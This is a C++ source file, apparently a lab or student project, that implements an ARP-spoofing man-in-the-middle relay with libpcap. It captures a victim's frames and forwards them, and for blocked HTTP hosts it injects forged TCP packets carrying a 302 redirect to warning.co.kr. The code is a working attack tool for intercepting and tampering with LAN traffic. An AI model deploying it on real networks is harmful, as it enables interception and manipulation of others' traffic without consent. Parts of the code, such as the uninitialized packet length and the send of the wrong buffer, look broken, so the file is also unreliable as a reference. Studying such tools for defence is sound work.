#include<iostream>
#include<cstring>
#include<stdio.h>
#include<unistd.h>
#include<pcap/pcap.h>
#include<arpa/inet.h>
#include<sys/ioctl.h>
#include<sys/socket.h>
#include<net/if.h>
#include"header.h"
#include"catcher.h"
#include"filtering.h"
using namespace std;
ARPSpoofer::ARPSpoofer(const char *dev, const char *txipaddr, const char *rxipaddr)
{
    this->dev = dev;
    memset(&Myipaddr,0x00,sizeof(Myipaddr));
    memset(Myhwaddr,0x00,sizeof(Myhwaddr));

    getmyaddr();
    inet_pton(AF_INET,rxipaddr,&RXipaddr);
    inet_pton(AF_INET,txipaddr,&TXipaddr);

    memset(RXhwaddr,0x00,sizeof(RXhwaddr));
    memset(TXhwaddr,0x00,sizeof(TXhwaddr));
    gethwaddr(&TXipaddr,TXhwaddr);
    gethwaddr(&RXipaddr,RXhwaddr);
}

void ARPSpoofer::getmyaddr(void)
{
    int s;
    struct ifreq buffer;
    s = socket(AF_INET,SOCK_DGRAM,0);
    memset(&buffer,0x00,sizeof(buffer));
    buffer.ifr_addr.sa_family = AF_INET;
    strncpy(buffer.ifr_name,dev,IFNAMSIZ-1);
    // hw
    if(ioctl(s,SIOCGIFHWADDR, &buffer)<0)
    {
        perror("ioctl");
        exit(3);
    }
    memcpy(Myhwaddr,buffer.ifr_hwaddr.sa_data,ETH_ALEN);
    // ip
    if(ioctl(s,SIOCGIFADDR,&buffer)<0)
    {
        perror("ioctl");
        exit(4);
    }
    memcpy(&Myipaddr,&(((struct sockaddr_in *)&buffer.ifr_addr)->sin_addr),sizeof(struct in_addr));
    close(s);

}
void ARPSpoofer::recvarp(in_addr *srcip, uint8_t *srchw,\
                         in_addr *dstip, uint8_t *dsthw, const char* filter)
{
    pcap_t *handle;
    struct bpf_program fp;
    bpf_u_int32 mask,net;
    struct pcap_pkthdr *header;
    const u_char *packet;
    char errbuf[PCAP_ERRBUF_SIZE];
    int ret;

    if(pcap_lookupnet(dev,&net,&mask,errbuf) == -1)
    {
        cout << "[!] pcap_lookupnet " << errbuf << endl;
        return;
    }
    if((handle=pcap_open_live(dev,BUFSIZ,1,1,errbuf))==NULL)
    {
        cout << "[!] pcap_open_live " << errbuf << endl;
        return;
    }
    if(pcap_compile(handle,&fp,filter,0,net) == -1)
    {
        cout << "[!] pcap_compile " << pcap_geterr(handle) << endl;
        return;
    }
    if(pcap_setfilter(handle,&fp) == -1)
    {
        cout << "[!] pcap_setfilter " << pcap_geterr(handle) << endl;
        return;
    }

    while(true)
    {
        if((ret = pcap_next_ex(handle,&header,&packet)) == -1)
        {
            cout << "[!] pcap_next_ex " << pcap_geterr(handle) << endl;
            break;
        }
        if(ret == 0)
            continue;
        arp_header *arph = (arp_header*)(packet+sizeof(ether_header));
        if(ntohs(arph->arp_op) == ARP_REPLY)
        {
            if((arph->arp_destpaddr == srcip->s_addr) \
                    && (!memcmp(arph->arp_desthaddr,srchw,6)) \
                    && (arph->arp_srpaddr == dstip->s_addr))
            {
                memcpy(dsthw,arph->arp_srhaddr,6);
                break;
            }
        }

    }
    pcap_close(handle);
    return;

}
void ARPSpoofer::sendarp(in_addr *srcip, uint8_t *srchw,\
                          in_addr *dstip, uint8_t *dsthw)
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char buffer[BUFSIZE-1] = {0};
    ether_header *eth;
    arp_header *arph;
    if((handle=pcap_open_live(dev,BUFSIZ,1,1000,errbuf))==NULL)
    {
        cout << "[!] pcap_open_live " << errbuf << endl;
        return;
    }
    eth = (ether_header*)buffer;
    memcpy(eth->eth_src,srchw,6);
    memcpy(eth->eth_dst,"\xff\xff\xff\xff\xff\xff",6);
    eth->eth_type = htons(ETHERTYPE_ARP);
    arph = (arp_header*)&buffer[sizeof(ether_header)];
    arph->arp_htype = htons(ARP_ETHER);
    arph->arp_ptype = htons(ARP_IP);
    arph->arp_hlen = ARP_ETHERL;
    arph->arp_plen = ARP_IPL;
    arph->arp_op = htons(ARP_REQUEST);
    memcpy(arph->arp_srhaddr,srchw,6);
    arph->arp_srpaddr = srcip->s_addr;
    memcpy(arph->arp_desthaddr,dsthw,6);
    arph->arp_destpaddr = dstip->s_addr;
    if(pcap_sendpacket(handle,buffer,sizeof(ether_header)+sizeof(arp_header))!=0)
    {
        cout << "[!] pcap_sendpacket " << endl;
        return;
    }
    return;
}

void ARPSpoofer::gethwaddr(struct in_addr* targetip,uint8_t* targethw)
{
    char filter_exp[100]={0};
    char srchwbuf[100]={0};
    int i;
    for(i=0;i<6;i++)
        sprintf(srchwbuf,"%s%02X%c",srchwbuf,Myhwaddr[i],(i==5)? ' ':':');
    sprintf(filter_exp,"ether dst %s&& ether proto \\arp",srchwbuf);
    thread th(std::bind(&ARPSpoofer::recvarp,this,&Myipaddr,Myhwaddr,targetip,targethw,filter_exp));
    sendarp(&Myipaddr,Myhwaddr,targetip,targethw);
    th.join();
}
uint16_t checksumc(pseudo_header *phs,tcp_header *tcphs,u_char* data)
{
    u_char buf[65536];
    int len,i=0;
    memcpy(buf,phs,sizeof(pseudo_header));
    memcpy(&buf[sizeof(pseudo_header)],tcphs,sizeof(tcp_header));
    memcpy(&buf[sizeof(pseudo_header)+sizeof(tcp_header)],data,strlen((char*)data));
    register unsigned long sum = 0;
    len = (sizeof(pseudo_header)+sizeof(tcp_header)+strlen((char*)data))/sizeof(unsigned short);
    while(len--)
        sum += (unsigned short)buf[i++];

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);

    return (unsigned short)(~sum);

}

void send_packet(const u_char *packet,pcap_t *handle)
{
    uint32_t i;
    u_char buf[65536];
    ether_header *eth,eths;
    ip_header *iph,iphs;
    tcp_header *tcph,tcphs;
    pseudo_header phs;
    u_char message[] = "HTTP/1.1 302 Found\r\nLocation: http://warning.co.kr\r\n\r\n";
    eth = (ether_header*)packet;
    iph = (ip_header*)(packet+sizeof(ether_header));
    tcph = (tcp_header*)(packet+sizeof(ether_header)+(iph->ip_hi * 4));

    memset(&tcphs,0,sizeof(tcp_header));
    tcphs.tcp_dport = tcph->tcp_sport;
    tcphs.tcp_sport = tcph->tcp_dport;
    tcphs.tcp_hlen = 5;
    tcphs.tcp_seqnum = tcph->tcp_seqnum;
    tcphs.tcp_acknum = htonl(ntohl(tcph->tcp_acknum)+iph->ip_len-(iph->ip_hi*4)-(tcph->tcp_hlen*4));
    tcphs.tcp_flag = 0x18;
    tcphs.tcp_win = htons(4096);

    phs.ps_destaddr = iph->ip_src;
    phs.ps_sraddr = iph->ip_dst;
    phs.ps_protocol = iph->ip_p;
    phs.ps_reserve = 0;
    phs.ps_seglen = 20+strlen((char*)message);
    tcphs.tcp_sum = htons(checksumc(&phs,&tcphs,message));

    memset(&iphs,0,sizeof(iphs));
    iphs.ip_dst = iph->ip_src;
    iphs.ip_src = iph->ip_dst;
    iphs.ip_vi = iph->ip_vi;
    iphs.ip_hi = iph->ip_hi;
    iphs.ip_len = htons(40+strlen((char*)message));
    iphs.ip_ttl = htons(60);
    iphs.ip_p = iph->ip_p;

    memcpy(eths.eth_dst,eth->eth_src,6);
    memcpy(eths.eth_src,eth->eth_dst,6);
    eths.eth_type=eth->eth_type;
    memcpy(buf,&eths,sizeof(ether_header));
    i += sizeof(ether_header);
    memcpy(&buf[i],&iphs,sizeof(ip_header));
    i += sizeof(ip_header);
    memcpy(&buf[i],&tcphs,sizeof(tcp_header));
    i += sizeof(tcp_header);
    memcpy(&buf[i],message,strlen((char*)message));
    i += strlen((char*)message);
    pcap_sendpacket(handle,packet,i);
}

void ARPSpoofer::relayingpacket(pcap_t* handle, uint8_t* dsthw ,uint8_t* srchw)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    ether_header *eth;
    ip_header *iph;
    tcp_header *tcph;
    int i,ret,off;
    filtering filter("filter");
    char tofind[65536];


    while(this->state)
    {
        if((ret = pcap_next_ex(handle,&header,&packet)) == -1)
        {
            cout << "[!] pcap_next_ex " << pcap_geterr(handle) << endl;
            break;
        }
        if(ret == 0)
            continue;
        eth = (ether_header*)packet;
        iph = (ip_header*)(packet+sizeof(ether_header));
        if(iph->ip_p == IP_PROTO_TCP)
        {
            tcph = (tcp_header*)(packet+sizeof(ether_header)+(iph->ip_hi * 4));

            if(ntohs(tcph->tcp_dport) == 80 || ntohs(tcph->tcp_sport) == 80)
            {

                off = filter.search("Host:",(char*)packet,0);
                cout << off << endl;
                if(off != -1)
                {
                    off+=6;
                    tofind[0] = '\n';
                    for(i=1;packet[off]!='\r';i++)
                        tofind[i] = packet[off++];
                    tofind[i] = '\n';
                    tofind[i+1] = '\x00';
                    if(filter.searchfi(tofind) == true)
                    {
                        send_packet(packet,handle);
                        cout << "[*] BLOCKED" << endl;
                        continue;
                    }
                }
            }
        }

        memcpy(eth->eth_dst,dsthw,6);
        memcpy(eth->eth_src,srchw,6);
        if(pcap_sendpacket(handle,packet,sizeof(ether_header)+ntohs(iph->ip_len))!=0)
            cout << "[IGNORE] pcap_sendpacket " <<pcap_geterr(handle) << " " << sizeof(ether_header)+ntohs(iph->ip_len) << endl;

    }
    pcap_close(handle);

}

void ARPSpoofer::startrelay(void)
{
    pcap_t *handle;
    struct bpf_program fp;
    bpf_u_int32 mask,net;
    char errbuf[PCAP_ERRBUF_SIZE];
    char filter[100]={0};
    char myipbuf[100]={0};
    inet_ntop(AF_INET,&Myipaddr.s_addr,myipbuf,sizeof(myipbuf));

    char srchwbuf[100]={0};
    int i;
    for(i=0;i<6;i++)
        sprintf(srchwbuf,"%s%02X%c",srchwbuf,this->TXhwaddr[i],(i==5)? ' ':':');
    sprintf(filter,"ether src %s && not ip dst %s",srchwbuf,myipbuf);
    cout << filter << endl;
    if(pcap_lookupnet(dev,&net,&mask,errbuf) == -1)
    {
        cout << "[!] pcap_lookupnet " << errbuf << endl;
        return;
    }
    if((handle=pcap_open_live(dev,BUFSIZ,1,1,errbuf))==NULL)
    {
        cout << "[!] pcap_open_live " << errbuf << endl;
        return;
    }
    if(pcap_compile(handle,&fp,filter,0,net) == -1)
    {
        cout << "[!] pcap_compile " << pcap_geterr(handle) << endl;
        return;
    }
    if(pcap_setfilter(handle,&fp) == -1)
    {
        cout << "[!] pcap_setfilter " << pcap_geterr(handle) << endl;
        return;
    }
    this->th.push_back(thread(std::bind(&ARPSpoofer::relayingpacket,this,handle,RXhwaddr,Myhwaddr)));
}

void ARPSpoofer::startarpspoofing(void)
{
    state = true;
    startrelay();
}
void ARPSpoofer::stoparpspoofing(void)
{
    this->state = false;
    sleep(2);
    for(auto& thp : th){
        thp.detach();
    }

}
